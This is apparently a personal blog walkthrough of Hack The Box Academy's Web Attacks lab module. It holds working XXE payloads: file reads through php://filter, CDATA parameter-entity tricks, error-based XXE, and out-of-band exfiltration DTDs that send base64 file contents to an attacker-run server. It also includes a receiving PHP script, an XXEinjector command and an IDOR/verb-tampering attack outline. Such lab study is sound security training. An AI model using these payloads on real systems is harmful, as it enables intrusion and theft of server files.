---
layout: post
title:  "Hack The Box - Academy - Web Attacks"
description: "Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection and  elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-11-11 22:31
image:  /images/htb/web-attacks/logo.png
tags:   [httb-verb-tampering,idor,xxe,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection

>
<b>References:</b>
<br/>
<a href="https://academy.hackthebox.com/module/134/section/1158">Web Attacks</a><br/>
<a href="https://jacozwarts.github.io/images/htb/web-attacks/Web_Attacks_Module_Cheat_Sheet.pdf">Web Attacks - Cheat Sheet</a><br/>

# Notes:

### XXE

#### Read PHP source code with `base64` encode filter

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>Test</name>
<tel>01234566789</tel>
<email>&company;</email>
<message>Testing form</message>
</root>
```

#### Advanced File Disclosure - Exercise
<a href="https://academy.hackthebox.com/module/134/section/1206">Hack The Box - Advanced File Disclosure</a><br/>

##### CDATA
`CDATA` is used to output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

`Below explanation is extracted from Hack The Box Web Attacks - CDATA:`

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.

1. Create dtd file:
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```
2. Start python web server on port 8000
```
python3 -m http.server 8000
```
3. Send updated payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///flag.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://{IP_ADDRESS}:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```
![XXE CDATA Result](/images/htb/web-attacks/xxe_cdata.png)

##### Error Based


`Extracted from Hack The Box Web Attacks - Error Based XXE`

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.


Steps to read the `flag.php` using `Error Based` XXE:
1. Inject and invalid parameter to see if errors are returned.

![XXE Error Based Request](/images/htb/web-attacks/xxe_error_based.png)

2. Create a dtd file with the below payload:

```
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

3. Create a python webserver
```
python3 -m http.server 8000
```

4. Send the below request to read flag.php
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.205:8000/xxe_error.dtd">
  %remote;
  %error;
]><root>
<name>Error based XXE</name>
<tel>0123456789</tel>
<email>test@gmail.com</email>
<message>Testing for Error based XXE</message>
</root>
```

![XXE Error Based Result](/images/htb/web-attacks/xxe_error_based_result.png)
<hr/>

#### Blind Data Exfiltration - Exercise

##### Manual:

1. Create the dtd file to exfiltrate the flag:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/{Flag_file.php}">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{YOUR_IP_ADDRESS}:8000/?content=%file;'>">
```

2. Create the php file to display the request's content:
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

3. Start the PHP server:
```
php -S 0.0.0.0:8000
```

4. Submit the payload to trigger the Blind Data Exfiltration:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://{YOUR_IP_ADDRESS}:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

<hr/>

##### Using <a href="https://github.com/enjoiz/XXEinjector">XXEInjector</a>:
1. Save request from proxy to a file `xxe.req`
2. Execute below command to run XXEInjector:
```
ruby XXEinjector.rb --host={YOUR_IP_ADDRESS} --httpport=8000 --file=/tmp/xxe.req --path=/{FLAG_FILE.php} --oob=http --phpfilter
```

<hr/>

## Skills Assessment
><b>Overview:</b>
You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.<br/><br/>The login details are provided in the question below.<br/><br/>

Work in progress:

1. Login with the credentials provided
2. Intercept all request and explore the App's Main feauters
IDOR to get user details - look for admin user
get user token
reset user - Notice denied and try http verb tampering. change to PUT and add query parameters.
Login with admin user
Explore new features notice create event notice this requests uses xml. Submit an event and see if any of the parameter's are displayed in the response.
Use php filter to test to see if we can read local files
Update the payload to read /flag.php


<hr/>